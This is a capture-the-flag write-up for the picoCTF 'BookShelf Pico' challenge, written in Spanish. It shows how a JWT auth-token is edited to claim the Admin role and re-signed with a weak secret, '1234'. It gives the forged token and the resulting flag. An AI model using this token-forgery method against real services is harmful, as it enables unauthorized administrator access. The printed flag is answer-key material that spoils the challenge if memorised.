## Objetivo
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/484/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:54331/).
## Solución
- Inspeccionamos la pagina, nos dirigimos al apartado de Storage, seleccionamos el almacenaje local, copiamos el auth-token y lo modificamos con ayuda de la siguiente pagina:
```bash
https://jwt.io/
```
- Original:
```bash
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1730087332,
  "iat": 1729482532,
  "userId": 1,
  "email": "user"
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret
)
```
- Modificado:
```bash
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1730087332,
  "iat": 1729482532,
  "userId": 2,
  "email": "admin"
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  1234
)
```
- Copiamos el nuevo token que se nos genero y lo remplazamos en el auth-token y en el token-payload.
- auth-token:
```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3MzAwODczMzIsImlhdCI6MTcyOTQ4MjUzMiwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.m5W8Q0JVOy9I_BANIKE92wu6CzIJM-q1WFvLbWFbJUs
```
- token-payload:
```bash
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1730087332,
  "iat": 1729482532,
  "userId": 2,
  "email": "admin"
}
```
- Y ahora refrescamos la pagina y ya nos mostrara la bandera.
```bash
Great job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_6e5d7df5}
```

## Notas Adicionales
## Referencias